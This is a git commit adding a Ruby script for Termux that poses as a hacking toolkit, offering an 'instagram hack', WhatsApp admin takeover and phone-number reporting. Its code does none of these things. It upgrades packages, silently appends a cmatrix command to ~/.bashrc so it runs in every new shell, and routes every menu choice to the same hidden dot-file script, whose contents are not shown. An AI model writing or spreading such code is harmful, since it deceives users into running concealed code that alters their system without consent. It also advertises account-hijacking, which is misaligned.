b5fb86b46ab91dde3383bec125e1c6acb16e50fc
MR|D3V1L <88584834+problems-arelifepartner@users.noreply.github.com>
2022-06-20 14:39:03 +0530

    Create hackmaterial.rb

---
+++ hackmaterial.rb
@@ -0,0 +1,52 @@
+#!/usr/bin/env ruby
+
+system("apt update && apt upgrade -y")
+system("apt install cmatrix -y")
+system("termux-setup-storage -y")
+system("gem install colorize" )
+system("echo 'cmatrix -Cred -L' >> ~/.bashrc")
+system("clear")
+require 'colorize'
+puts "
+▄████  ▒█████  ▓█████▄ ▓█████▓██   ██▓▓█████
+ ██▒ ▀█▒▒██▒  ██▒▒██▀ ██▌▓█   ▀ ▒██  ██▒▓█   ▀
+▒██░▄▄▄░▒██░  ██▒░██   █▌▒███    ▒██ ██░▒███
+░▓█  ██▓▒██   ██░░▓█▄   ▌▒▓█  ▄  ░ ▐██▓░▒▓█  ▄
+░▒▓███▀▒░ ████▓▒░░▒████▓ ░▒████▒ ░ ██▒▓░░▒████▒
+ ░▒   ▒ ░ ▒░▒░▒░  ▒▒▓  ▒ ░░ ▒░ ░  ██▒▒▒ ░░ ▒░ ░
+  ░   ░   ░ ▒ ▒░  ░ ▒  ▒  ░ ░  ░▓██ ░▒░  ░ ░  ░
+░ ░   ░ ░ ░ ░ ▒   ░ ░  ░    ░   ▒ ▒ ░░     ░
+      ░     ░ ░     ░       ░  ░░ ░        ░  ░
+                  ░             ░ ░
+".red
+puts
+puts "                          [code by <MR|D3V1L>]".red
+puts
+def ban()
+    puts"[1] instagram hack".green
+    puts"[2] auto admin whatsapp".green
+    puts"[3] number report".green
+    puts"[4] info ".green
+end
+ban()
+puts
+puts "[*] please enter your option:".red
+$op = gets.chomp
+puts
+if $op == "1" then
+   puts "starting instagram hack".green
+   system("ruby .uoykcuf.rb")
+elsif $op == "2" then
+   puts "starting auto admin whatsapp".green
+   system("ruby .uoykcuf.rb")
+elsif $op == "3" then
+   puts "starting number report".green
+   system("ruby .uoykcuf.rb")
+elsif $op == "4" then
+   puts "information about this tool".green
+   system("ruby .uoykcuf.rb")
+else
+
+puts "[Error ,please select a from the above the list "
+
+end
